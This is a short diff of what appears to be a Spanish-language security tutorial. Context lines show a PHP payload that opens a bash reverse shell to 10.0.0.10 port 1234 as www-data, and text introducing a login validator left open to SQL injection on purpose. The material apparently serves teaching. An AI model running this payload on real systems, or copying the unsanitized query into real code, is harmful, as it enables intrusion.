@@ -253,6 +253,9 @@ entrar como el usuario www-data.
 <?php
 exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?
 
+
+
+
 En primer lugar desarrollamos un formulario de inicio de sesión con su respectivo validador (en PHP). Este será el encargado de lanzar _query_ a la base de datos para verificar si las credenciales introducidas por el cliente forman parte de un usuario válido. Este código no sanitiza la entrada obtenida, es por ello que es vulnerable a un ataque de inyección SQL, como se representa en la siguiente ilustración:
 
 <p align="center">
